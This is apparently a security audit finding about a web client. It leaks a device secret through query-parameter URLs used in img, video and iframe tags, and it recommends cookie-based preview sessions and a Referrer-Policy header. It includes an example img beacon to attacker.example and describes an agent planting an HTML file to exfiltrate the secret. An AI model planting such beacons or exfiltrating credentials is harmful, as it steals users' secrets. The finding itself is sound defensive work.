# Device secret leaked via query-param URLs for raw file endpoint

- **Difficulty:** easy
- **Urgency:** high
- **File:** `web/src/lib/api.ts`
- **Lines:** 50-75

## Description

`appendDeviceCredential` writes `deviceId` and `secret` as URL query params. `rawFileUrl` builds `/api/workspaces/{id}/raw?path=…&deviceId=…&secret=…` and this URL is used directly as the `src` of `<img>`, `<video>`, `<audio>`, and the `<iframe>` in `FileViewer.tsx:562-571` (`HtmlViewer`). The secret in the URL leaks through three channels: (1) server access logs (the backend logs request lines including query strings); (2) browser history; (3) the `Referer` header when the loaded content makes cross-origin requests. For the HTML iframe specifically, a workspace HTML file containing `<img src="https://attacker.example/beacon">` causes the browser to send a `Referer` header containing the full iframe URL including the `secret` query param unless a `Referrer-Policy` header suppresses it. The backend sets `Referrer-Policy: no-referrer` only on `/preview/{id}/{*path}` responses (`api/mod.rs:720`), not on `/raw`. Modern Chrome defaults to `strict-origin-when-cross-origin` (origin only), but older browsers and some current browsers will send the full URL. An agent (or any file already in the workspace) can plant an HTML file with an external beacon and exfiltrate the device secret when the user opens it.

## Recommendation

Use the same HttpOnly-cookie preview-session pattern already implemented for `BrowsePreview` (`api.createPreviewSession` → `/preview/{id}/{path}` with `preview_token` cookie, `api.ts:83-91`, `BrowsePreview.tsx:50-52`) for the `HtmlViewer` and other media tags, instead of putting the secret in the URL. If query-param auth must remain for media tags, set `Referrer-Policy: no-referrer` on the `/raw` response and ensure the backend does not log query strings for authenticated routes.

## Verification

`api.ts:54-61` `appendDeviceCredential` sets `deviceId`/`secret` query params; `api.ts:72-75` `rawFileUrl` returns the URL with those params; `FileViewer.tsx:565` `<iframe src={url} … sandbox="allow-same-origin">` where `url` is `rawFileUrl(...)` from `FileViewer.tsx:84`. Contrast with `BrowsePreview.tsx:50-52` which uses `api.createPreviewSession` (cookie-based) and `previewFileUrl` (no secret in URL, `api.ts:83-91`).
